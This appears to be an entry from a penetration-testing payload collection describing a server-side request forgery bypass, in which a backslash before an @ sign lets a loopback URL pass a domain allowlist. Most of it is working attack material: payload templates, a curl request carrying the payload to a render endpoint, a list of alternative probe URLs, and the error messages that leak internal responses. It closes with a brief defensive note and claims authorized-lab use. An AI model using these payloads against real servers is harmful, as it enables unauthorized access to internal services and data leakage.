# Backslash-`@` Allowlist Loopback Bypass

## Context

Use only in authorized labs, owned apps, in-scope targets, or defensive validation.

Apply when:

- a server fetches a user-supplied URL
- policy requires an allowed domain (e.g. `pwnbox-lab.com`)
- plain `http://127.0.0.1:[port]/` is rejected
- fragment and/or classic userinfo may already be blocked
- errors may include upstream response bodies

## Payload

```text
http://127.0.0.1:[port]\[@][allowed-host]/
```

Concrete shape:

```text
http://127.0.0.1:1337\@app.example.com/
```

JSON body example:

```bash
curl -sS -X POST "https://[host]/api/render" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:1337\\@[host]/"}'
```

## Companion Probes

```text
http://127.0.0.1:1337/                         # expect reject
http://[allowed]/@127.0.0.1:1337/              # classic userinfo
http://127.0.0.1:1337@[allowed]/               # reverse userinfo
http://127.0.0.1:1337/#https://[allowed]/      # fragment
http://127.0.0.1:1337%5c@[allowed]/            # encoded backslash
```

## Expected Signal

```text
Reject:  URL must be from [allowed]
Success: fetch reaches loopback; body or error oracle shows internal content
```

Image-renderer variant:

```text
URL did not return an image (got: 'text/plain') — response: [flag/body]
```

## Why It Works

Allowlist still matches the allowed domain token; the HTTP client’s authority parsing treats `\@` differently and connects to the loopback host/port.

## Why It Fails

- Strict parse-then-allowlist on `hostname`
- Backslash stripped or rejected
- Private IP block after resolve
- Blind fetcher with no body reflection

## Defensive Note

One parser, canonical hostname allowlist, reject `\` and userinfo, block loopback after DNS, generic errors only.

## Related

- `notes/ssrf-backslash-userinfo-allowlist-bypass.md`
- `payloads/ssrf/fragment-allowlist-loopback-bypass.md`
- `payloads/ssrf/userinfo-fragment-loopback-bypass.md`
